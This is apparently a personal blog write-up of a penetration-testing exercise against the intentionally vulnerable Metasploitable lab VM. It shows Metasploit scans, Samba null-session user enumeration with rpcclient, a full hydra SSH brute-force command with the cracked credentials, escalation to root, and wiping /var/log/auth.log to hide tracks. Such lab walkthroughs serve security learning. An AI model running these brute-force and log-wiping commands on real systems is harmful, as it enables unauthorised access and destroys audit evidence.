<!--hacking, metasploit, ssh-->
# More hacking!

This is a follow up of my last post on hacking that can be read [here](https://filimon-danopoulos.github.io/posts/2014-11-12_Metasploitable-1/). 
This time I will try my hands on the next service running on port 22. During this exercise I searched the web a bit and found numerous guides
on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject.
This means I might very well find sub-optimal solutions for some problems, deal with it!

## The target

I will target the same Metasploitable VM under the exact same circumstances as last time.
Running on port 22 it has (from the previous `nmap` scan that I saved to the file `target`):

    22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

## Hack away!

Since I have already scanned all the ports and know the version of the software I am targeting I have to find 
some kind of weakness to exploit.

### Searching

A quick search in the Metasploit console gives me loads of hits. 
This is a partial result after I removed all irrelevant hits and cleaned up the output a bit:

    msf > search ssh

    Matching Modules
    ================

     Name                                            Rank       Description
     ----                                            ----       -----------
     auxiliary/fuzzers/ssh/ssh_kexinit_corrupt       normal     SSH Key Exchange Init Corruption
     auxiliary/fuzzers/ssh/ssh_version_15            normal     SSH 1.5 Version Fuzzer
     auxiliary/fuzzers/ssh/ssh_version_2             normal     SSH 2.0 Version Fuzzer
     auxiliary/fuzzers/ssh/ssh_version_corrupt       normal     SSH Version Corruption
     auxiliary/pro/apps/ssh_key                      normal     PRO: SSH Key Recycler
     auxiliary/pro/scanner/ssh/ssh_login_credential  normal     SSH Public Key Login Scanner
     auxiliary/scanner/ssh/cerberus_sftp_enumusers   normal     Cerberus FTP Server SFTP Username Enumeration
     auxiliary/scanner/ssh/ssh_enumusers             normal     SSH Username Enumeration
     auxiliary/scanner/ssh/ssh_identify_pubkeys      normal     SSH Public Key Acceptance Scanner
     auxiliary/scanner/ssh/ssh_login                 normal     SSH Login Check Scanner
     auxiliary/scanner/ssh/ssh_login_pubkey          normal     SSH Public Key Login Scanner
     auxiliary/scanner/ssh/ssh_version               normal     SSH Version Scanner
     exploit/linux/ssh/f5_bigip_known_privkey        excellent  F5 BIG-IP SSH Private Key Exposure
     exploit/linux/ssh/quantum_dxi_known_privkey     excellent  Quantum DXi V1000 SSH Private Key Exposure
     exploit/linux/ssh/quantum_vmpro_backdoor        excellent  Quantum vmPRO Backdoor Command
     exploit/linux/ssh/symantec_smg_ssh              excellent  Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
     exploit/multi/http/gitlab_shell_exec            excellent  Gitlab-shell Code Execution
     exploit/multi/ssh/sshexec                       manual     SSH User Code Execution
     post/linux/gather/enum_network                  normal     Linux Gather Network Information
     post/multi/gather/ssh_creds                     normal     Multi Gather OpenSSH PKI Credentials Collection

This is a lot to take in and at first glance nothing seems applicable as a quick exploit. So instead of wasting time going through everything
I turn to the next tool, `searchsploit`. My aim is to find an SSH exploit that is not in metasploit.

    # searchsploit openssh
     Description                                                                         Path
    ---------------------------------------------------------------------------------- ----------------------------------
    OpenSSH/PAM <= 3.6.1p1 Remote Users Discovery Tool                                | /linux/remote/25.c
    OpenSSH/PAM <= 3.6.1p1 Remote Users Ident (gossh.sh)                              | /linux/remote/26.sh
    glibc-2.2 and openssh-2.3.0p1 exploits glibc => 2.1.9x                            | /linux/local/258.sh
    Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service                  | /multiple/dos/1572.pl
    OpenSSH <= 4.3 p1 (Duplicated Block) Remote Denial of Service Exploit             | /multiple/dos/2444.sh
    Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Timing Attack Exploit                   | /multiple/remote/3303.sh
    Debian OpenSSH Remote SELinux Privilege Elevation Exploit (auth)                  | /linux/remote/6094.txt
    Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                | /novell/dos/14866.txt
    FreeBSD OpenSSH 3.5p1 - Remote Root Exploit                                       | /freebsd/remote/17462.txt
    OpenSSH 1.2 scp File Create/Overwrite Vulnerability                               | /linux/remote/20253.sh
    OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By-One Vulnerability                     | /unix/remote/21314.txt
    OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buffer Overflow Vulnerability            | /linux/remote/21402.txt
    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (1)                | /unix/remote/21578.txt
    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (2)                | /unix/remote/21579.txt

Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. 

### Scanning

I decided to run `auxiliary/scanner/ssh/ssh_version` in order to verify that the version I found earlier is valid.

    msf > use auxiliary/scanner/ssh/ssh_version  
    msf auxiliary(ssh_version) > show options

    Module options (auxiliary/scanner/ssh/ssh_version):

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       RHOSTS                    yes       The target address range or CIDR identifier
       RPORT    22               yes       The target port
       THREADS  1                yes       The number of concurrent threads
       TIMEOUT  30               yes       Timeout for the SSH probe

    msf auxiliary(ssh_version) > set RHOSTS 192.168.56.103
    RHOSTS => 192.168.56.103
    msf auxiliary(ssh_version) > run

    [*] 192.168.56.103:22, SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    
This verifies the version. Let's go to the next step!

At this stage I want to apply a vulnerability scanner like openvas, but I failed with the setup (didn't read the manual) and I can't 
be bothered with that since I want to get in the machine! I don't think a vulnerability scanner would add much at this stage any how.

Next up is a common SSH vulnerability: brute forcing, but fist...

### Enumeration of users

I glance over the result from the metasploit search I did earlier to find something that would help with the brute forcing and see `auxiliary/scanner/ssh/ssh_enumusers`.
Having a set of valid users will really help speed up the brute forcing so I check if it is applicable (edited for brevity):

    msf > info auxiliary/scanner/ssh/ssh_enumusers 

    Name: SSH Username Enumeration
    Module: auxiliary/scanner/ssh/ssh_enumusers
    License: Metasploit Framework License (BSD)
    Rank: Normal

    Description:
      This module uses a time-based attack to enumerate users on an 
      OpenSSH server. On some versions of OpenSSH under some 
      configurations, OpenSSH will return a "permission denied" error for 
      an invalid user faster than for a valid user.

    References:
      http://cvedetails.com/cve/2006-5229/
      http://www.osvdb.org/32721
      http://www.securityfocus.com/bid/20418


This doesn't tell me the affected version so I check the security focus [link](http://www.securityfocus.com/bid/20418) found under references. 
One of the affected versions is the one the target is running, sweet, let's do this!

    msf > use auxiliary/scanner/ssh/ssh_enumusers 
    msf auxiliary(ssh_enumusers) > show options

    Module options (auxiliary/scanner/ssh/ssh_enumusers):

       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       Proxies                     no        Use a proxy chain
       RHOSTS                      yes       The target address range or CIDR identifier
       RPORT      22               yes       The target port
       THREADS    1                yes       The number of concurrent threads
       THRESHOLD  10               yes       Amount of seconds needed before a user is considered found
       USER_FILE                   yes       File containing usernames, one per line

    msf auxiliary(ssh_enumusers) > set RHOSTS 192.168.56.103
    RHOSTS => 192.168.56.103
    msf auxiliary(ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
    USER_FILE => /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
    msf auxiliary(ssh_enumusers) > run

    [*] 192.168.56.103:22 - SSH - Checking for false positives
    [*] 192.168.56.103:22 - SSH - Starting scan
    .
    .
    .

After running this for a while I decide to stop the scan, it's super slow and some how didn't *feel* right.
I have a hunch that this approach will fail, and that the target is not vulnerable to this attack after all.

I really want to target all my effort on port 22 but I can't figure out a way to enumerate the users via SSH so instead I decided to do it via a Samba vulnerability.
My target is running (from my previous scan):
    
    139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
    
I know as a fact that Samba can be missconfigured to allow null sessions so I give it a try:
        
    # rpcclient -U "" 192.168.56.103
    Enter 's password: 
    rpcclient $>

So I have a null session up and running, next is just a simple command to get all the users:

    rpcclient $> enumdomusers
    user:[games] rid:[0x3f2]
    user:[nobody] rid:[0x1f5]
    user:[bind] rid:[0x4ba]
    user:[proxy] rid:[0x402]
    user:[syslog] rid:[0x4b4]
    user:[user] rid:[0xbba]
    user:[www-data] rid:[0x42a]
    user:[root] rid:[0x3e8]
    user:[news] rid:[0x3fa]
    user:[postgres] rid:[0x4c0]
    user:[bin] rid:[0x3ec]
    user:[mail] rid:[0x3f8]
    user:[distccd] rid:[0x4c6]
    user:[proftpd] rid:[0x4ca]
    user:[dhcp] rid:[0x4b2]
    user:[daemon] rid:[0x3ea]
    user:[sshd] rid:[0x4b8]
    user:[man] rid:[0x3f4]
    user:[lp] rid:[0x3f6]
    user:[mysql] rid:[0x4c2]
    user:[gnats] rid:[0x43a]
    user:[libuuid] rid:[0x4b0]
    user:[backup] rid:[0x42c]
    user:[msfadmin] rid:[0xbb8]
    user:[telnetd] rid:[0x4c8]
    user:[sys] rid:[0x3ee]
    user:[klog] rid:[0x4b6]
    user:[postfix] rid:[0x4bc]
    user:[service] rid:[0xbbc]
    user:[list] rid:[0x434]
    user:[irc] rid:[0x436]
    user:[ftp] rid:[0x4be]
    user:[tomcat55] rid:[0x4c4]
    user:[sync] rid:[0x3f0]
    user:[uucp] rid:[0x3fc]
    
And I get a list of all the users! I copy the above and create a file, open it in vim, paste the users into to it then format it to only include usernames:

    # touch users.lst
    # vim users.lst 
    # cat users.lst | cut -d[ -f2 | cut -d] -f1 > users.lst

### Brute forcing

With this is mind I turn to my number one tool for brute forcing: `hydra `. Time to bruteforce!

    # hydra -L ./users.lst -P /usr/share/john/password.lst -e nsr -t 8 -u ssh://192.168.56.103
    Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

    Hydra (http://www.thc.org/thc-hydra) starting at 2014-11-15 04:10:13
    [DATA] 8 tasks, 1 server, 121040 login tries (l:34/p:3560), ~15130 tries per task
    [DATA] attacking service ssh on port 22
    [22][ssh] host: 192.168.56.103   login: user   password: user
    [22][ssh] host: 192.168.56.103   login: postgres   password: postgres
    [22][ssh] host: 192.168.56.103   login: msfadmin   password: msfadmin
    [22][ssh] host: 192.168.56.103   login: service   password: service
    [STATUS] 303.00 tries/min, 303 tries in 00:01h, 120737 todo in 06:39h, 8 active
    [22][ssh] host: 192.168.56.103   login: klog   password: 123456789
    [STATUS] 268.67 tries/min, 806 tries in 00:03h, 120234 todo in 07:28h, 8 active
    [STATUS] 274.14 tries/min, 1919 tries in 00:07h, 119121 todo in 07:15h, 8 active
    [22][ssh] host: 192.168.56.103   login: sys   password: batman
    [STATUS] 273.60 tries/min, 4104 tries in 00:15h, 116936 todo in 07:08h, 8 active
    ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.


Success, at this point I just cancel the scan, I have proven my point and gotten a couple of user name password combos.
Now let me exlain the `hydra` call. There are quite a lot of options to explain so the break it up.

* `-L` defines the user name list.
* `-P` denotes a password set. I use the password list from JohnTheRipper here.
* `-e` gives any addititonal options, in this case; `n`, for `null` password; `s` for using user name as password; `r`, for using the username in reverse.
* `-t` dictates how many "tasks" should be run, defaults to 16 but has to be throtled to 8 otherwise it produces errors.
* `-u` tells hydra to apply each password to all users. This will find misconfigured (user name == password) users quicly
* Lastly we specify the actual target, in this case the protocol is defined as part of the URI.
    
Next we try to login to the machine via SSH:

    # ssh msfadmin@192.168.56.103
    The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
    RSA key fingerprint is 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '192.168.56.103' (RSA) to the list of known hosts.
    msfadmin@192.168.56.103's password: 
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.

    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    No mail.
    Last login: Sat Nov  8 13:19:44 2014
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    msfadmin@metasploitable:~$ sudo su
    [sudo] password for msfadmin: 
    root@metasploitable:/home/msfadmin# whoami
    root
    
### Clean up
    
So I have a user, a password and I can launch stuff as root! One of the things I have to do know is clear some of my tracks.
The file `/var/log/auth.log` will include a huge amount of information about our SSH enumeration attempt and brute force attack, 
the lazy way to clean it is just remove everything. This just covers the how but not the fact the machine was compromised.
    
    # grep 'sshd' /var/log/auth.log | wc -l
    26659
    # echo "" >  /var/log/auth.log
    
Here we can see that we have almost 27000 log entries related too SSH, after we wipe it nothing of that will remain. 
The elegant solution would be to just remove all the entries that our brute force attack created, but I can't be bothered at this stage since I have been at it for a while now.

### Summary

This was a lot harder than the port 21 hack but still not impossible. I made a clear mistake trying to enumerate the SSH user and should have gone
for the Samba vulnerability right away. I was a bit to focused to do this port by port for the heck of it, but that is not how pentesting works.
I had a wealth of information and available (and a root shell) from previous activity, so I wanted to put some restrictions on my self but had to break them.

Hopefully the next hack will not be as long a write up as this one!


